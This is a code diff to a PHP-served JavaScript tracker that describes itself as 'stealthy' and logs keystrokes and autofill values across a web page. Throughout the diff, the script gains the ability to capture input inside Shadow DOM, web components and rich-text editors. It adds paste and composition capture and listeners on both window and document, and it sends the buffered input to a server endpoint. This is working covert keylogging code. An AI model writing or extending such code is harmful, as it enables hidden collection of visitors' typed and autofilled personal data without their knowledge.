@@ -1,5 +1,6 @@
 <?php
 // tracker.php - High-speed, stealthy client-side key & autofill tracking script for typists
+// Supports dynamic JS components, Web Components, Shadow DOM, React/Vue/Angular, and rich text editors
 
 if (session_status() === PHP_SESSION_NONE) {
     @session_start();
@@ -106,25 +107,96 @@ if ($isDirectJsRequest) {
         return 'api.php';
     })();
 
-    // Element identification with caching
+    // Resolve real target element even inside Shadow DOM or custom Web Components
+    function getRealTarget(e) {
+        if (!e) return document.activeElement;
+
+        // Shadow DOM un-retargeting via composedPath
+        if (e.composedPath && typeof e.composedPath === 'function') {
+            var path = e.composedPath();
+            if (path && path.length > 0) {
+                for (var i = 0; i < path.length; i++) {
+                    var el = path[i];
+                    if (el && el.nodeType === 1) { // ELEMENT_NODE
+                        if (isElementEditable(el)) {
+                            return el;
+                        }
+                    }
+                }
+                if (path[0] && path[0].nodeType === 1) {
+                    return path[0];
+                }
+            }
+        }
+
+        var target = e.target || e.srcElement;
+        if (!target || target === document || target === window) {
+            target = document.activeElement;
+        }
+
+        // Deep shadow root activeElement resolution
+        while (target && target.shadowRoot && target.shadowRoot.activeElement) {
+            target = target.shadowRoot.activeElement;
+        }
+
+        return target;
+    }
+
+    // Comprehensive editable check for native inputs, contenteditable, shadow DOM, rich text, role=textbox
+    function isElementEditable(el) {
+        if (!el || el.nodeType !== 1) return false;
+
+        var tagName = el.tagName ? el.tagName.toUpperCase() : '';
+        if (tagName === 'INPUT' || tagName === 'TEXTAREA') {
+            return el.type !== 'password' && el.type !== 'button' && el.type !== 'submit' && el.type !== 'hidden';
+        }
+
+        if (el.isContentEditable || el.contentEditable === 'true' || el.contentEditable === 'events') {
+            return true;
+        }
+
+        var role = el.getAttribute ? el.getAttribute('role') : null;
+        if (role === 'textbox' || role === 'searchbox' || role === 'combobox') {
+            return true;
+        }
+
+        if (el.getAttribute && (el.getAttribute('data-slate-editor') !== null || el.getAttribute('contenteditable') !== null)) {
+            return true;
+        }
+
+        return false;
+    }
+
+    // Element identification with caching, supporting JS libraries & Shadow DOM hosts
     function getCachedFieldInfo(el) {
         if (!el) return { id: 'unknown', name: '' };
         if (el.__ttInfo) return el.__ttInfo;
 
         var fieldId = el.id || '';
-        if (!fieldId && el.name) {
-            fieldId = 'name:' + el.name;
+        var fieldName = el.name || '';
+
+        if (!fieldId && el.getAttribute) {
+            fieldId = el.getAttribute('name') || el.getAttribute('aria-label') || el.getAttribute('placeholder') || el.getAttribute('data-testid') || el.getAttribute('data-field') || el.getAttribute('role') || '';
+            if (fieldId) fieldId = 'attr:' + fieldId;
         }
-        if (!fieldId && el.getAttribute('placeholder')) {
-            fieldId = 'placeholder:' + el.getAttribute('placeholder');
+
+        // If inside Shadow DOM or custom component, check parent/host tag
+        if (!fieldId && el.getRootNode && el.getRootNode().host) {
+            var host = el.getRootNode().host;
+            var hostId = host.id || host.tagName.toLowerCase();
+            fieldId = 'shadow:' + hostId;
         }
+
         if (!fieldId) {
             var tag = el.tagName ? el.tagName.toLowerCase() : 'input';
             var type = el.type ? '[' + el.type + ']' : '';
             fieldId = tag + type;
         }
 
-        var fieldName = el.name || el.id || el.getAttribute('placeholder') || '';
+        if (!fieldName && el.getAttribute) {
+            fieldName = el.getAttribute('name') || el.getAttribute('aria-label') || el.getAttribute('placeholder') || el.id || '';
+        }
+
         if (!fieldName && el.labels && el.labels.length > 0) {
             fieldName = el.labels[0].innerText.trim();
         }
@@ -141,7 +213,6 @@ if ($isDirectJsRequest) {
     }
 
     function currentUserId() {
-        // Dynamic re-eval in case window.currentUser loaded after tracker script
         var latestId = getUserId();
         if (latestId) userId = latestId;
         return userId;
@@ -150,13 +221,8 @@ if ($isDirectJsRequest) {
     // Fast keypress recorder
     function recordKey(e) {
         try {
-            var target = e.target || e.srcElement;
-            if (!target) return;
-
-            var tagName = target.tagName ? target.tagName.toUpperCase() : '';
-            var isEditable = target.isContentEditable || tagName === 'INPUT' || tagName === 'TEXTAREA';
-            if (!isEditable) return;
-            if (target.type === 'password') return;
+            var target = getRealTarget(e);
+            if (!target || !isElementEditable(target)) return;
 
             var fieldInfo = getCachedFieldInfo(target);
             sequenceCounter++;
@@ -185,32 +251,28 @@ if ($isDirectJsRequest) {
         } catch(err) {}
     }
 
-    // Detect browser autofill or paste/value insertion without keypresses
+    // Detect browser autofill, paste, composition, or JS value injection
     function recordInputEvent(e) {
         try {
-            var target = e.target || e.srcElement;
-            if (!target) return;
-
-            var tagName = target.tagName ? target.tagName.toUpperCase() : '';
-            var isEditable = target.isContentEditable || tagName === 'INPUT' || tagName === 'TEXTAREA';
-            if (!isEditable) return;
-            if (target.type === 'password') return;
+            var target = getRealTarget(e);
+            if (!target || !isElementEditable(target)) return;
 
             var isAutofill = false;
             if (e.inputType === 'insertReplacementText' || e.inputType === 'insertFromPaste') {
                 isAutofill = true;
             } else if (!target.__ttLastKeyTime || (Date.now() - target.__ttLastKeyTime > 300)) {
-                if (target.value && target.value.length > 0) {
+                var currentVal = target.value || target.innerText || target.textContent || '';
+                if (currentVal && currentVal.length > 0) {
                     isAutofill = true;
                 }
             }
 
-            if (isAutofill && target.value) {
+            if (isAutofill) {
                 var fieldInfo = getCachedFieldInfo(target);
-                var val = target.value;
+                var val = target.value || target.innerText || target.textContent || '';
                 var lastHandledVal = target.__ttLastAutofillValue || '';
 
-                if (val !== lastHandledVal) {
+                if (val && val !== lastHandledVal) {
                     target.__ttLastAutofillValue = val;
                     var baseTime = (typeof performance !== 'undefined' && performance.now) ? (performance.timing ? performance.timing.navigationStart + performance.now() : Date.now()) : Date.now();
 
@@ -278,10 +340,18 @@ if ($isDirectJsRequest) {
         } catch(e) {}
     }
 
-    // Event listeners
-    document.addEventListener('keydown', recordKey, { capture: true, passive: true });
-    document.addEventListener('input', recordInputEvent, { capture: true, passive: true });
-    document.addEventListener('change', recordInputEvent, { capture: true, passive: true });
+    // Global event capture listeners on window and document to intercept ALL dynamic JS fields
+    var options = { capture: true, passive: true };
+
+    window.addEventListener('keydown', recordKey, options);
+    window.addEventListener('input', recordInputEvent, options);
+    window.addEventListener('change', recordInputEvent, options);
+    window.addEventListener('compositionend', recordInputEvent, options);
+
+    document.addEventListener('keydown', recordKey, options);
+    document.addEventListener('input', recordInputEvent, options);
+    document.addEventListener('change', recordInputEvent, options);
+    document.addEventListener('compositionend', recordInputEvent, options);
 
     // Background flushing
     setInterval(flushBuffer, flushIntervalMs);
